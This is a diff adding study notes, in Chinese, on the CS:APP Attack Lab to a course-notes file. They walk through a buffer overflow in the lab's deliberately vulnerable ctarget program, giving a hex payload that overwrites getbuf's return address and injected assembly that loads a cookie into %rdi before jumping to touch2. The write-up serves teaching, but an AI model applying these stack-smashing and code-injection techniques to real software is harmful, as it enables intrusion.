@@ -10,6 +10,7 @@
 
 - Data Lab：实现简单的逻辑、二进制补码和浮点函数
 - Bomb Lab：通过逆向工程来拆除炸弹
+- Attack Lab：完成代码注入和面向返回编程的攻击
 - Shell Lab：使用 job control 实现一个简单 Unix shell 程序
 
 ## 实验环境
@@ -864,6 +865,92 @@ node3 -> node4 -> node5 -> node6 -> node1 -> node2
 由于输入的数据与 7 做过差，因此我们可以得知**输入的数字顺序为：`4 -> 3 -> 2 -> 1 -> 6 -> 5`**。
 
 ![](image/csapp-bomblab-phase6.png)
+
+### Attack Lab
+
+#### 1. `ctarget` level 1
+
+`ctarget` 程序的 level 1 要求实现修改返回地址。`ctarget` 给出了 `test` 的程序代码：
+
+```c
+void test() {
+    int val;
+    val = getbuf();
+    printf("No exploit. Getbuf returned 0x%x\n", val);
+}
+```
+
+首先对 `ctarget` 进行反汇编 `objdump -d ctarget > ctarget.asm`，然后阅读 `getbuf` 的汇编代码：
+
+```assembly
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+  4017be:	90                   	nop
+  4017bf:	90                   	nop
+```
+
+现在，我们的目标就是要修改 `getbuf` 的返回地址，将其返回地址改为 `touch1` 程序的地址 `00000000004017c0`。我们知道，程序的栈空间是类似这样分配的：
+
+| 返回地址 |
+| :------: |
+| 分配空间 |
+| 分配空间 |
+| 分配空间 |
+
+那么当分配空间被写满时，由于没有边界检查，则会继续写入到返回地址中。在 `getbuf` 当中，程序分配了 40 个字节。因此我们需要先写入 40 个字节的无用信息，然后再把目标地址写入：
+
+```
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 /* 0x28 bytes for stack space */
+c0 17 40 00 00 00 00 00       /* address of touch1 */
+```
+
+![](image/csapp-attacklab-ctarget-level1.png)
+
+#### `ctarget` level 2
+
+首先从 level 2 的要求中可以了解到，我们需要让 `ctarget` 程序执行到 `touch2` 程序当中。同时在执行 `touch2` 之前，需要将 `cookie` 信息作为参数传入到寄存器 `%rdi` 当中。
+
+从 level 1 中我们可以知道，我们只有通过 `getbuf` 中获取的缓冲区内容才能完成代码注入攻击。与之前不同的是，现在不仅需要修改程序的返回地址，还需要执行其它的代码（将 `cookie` 信息作为参数传入到寄存器 `%rdi` 当中）因为我们只能通过 `getbuf` 中获取的缓冲区内容完成代码注入攻击，这就意味着我们需要执行在栈上的注入代码。那么，我们首先需要获取栈顶的地址：
+
+![](image/csapp-attacklab-ctarget-rsp.png)
+
+可以得到在 `getbuf` 分配空间后的栈顶地址为：`0x5561dc78`。为了在执行 `touch2` 之前完成参数的传递，因此我们需要修改 `getbuf` 函数的返回地址为栈顶地址 `0x5561dc78`（在这里与 level 1 是一样的）。
+
+接着我们就需要往栈顶中写入需要执行的代码（保存为 `level2.s`）：
+
+```assembly
+movq $0x59b997fa, %rdi
+pushq $0x4017ec
+retq
+```
+
+接着对其进行汇编得到 `level2.o`，然后再将 `level2.o` 反汇编成为 `level2.d`：
+
+```bash
+gcc -c level2.s
+objdump -d level2.o > level2.d
+```
+
+得到：
+
+```assembly
+0000000000000000 <.text>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	68 ec 17 40 00       	pushq  $0x4017ec
+   c:	c3                   	retq   
+```
+
+那么就有了注入的代码段，接着将其保存在 `level2.txt` 当中，然后运行：
+
+![](image/csapp-attacklab-ctarget-level2.png)
 
 ### Shell Lab
 
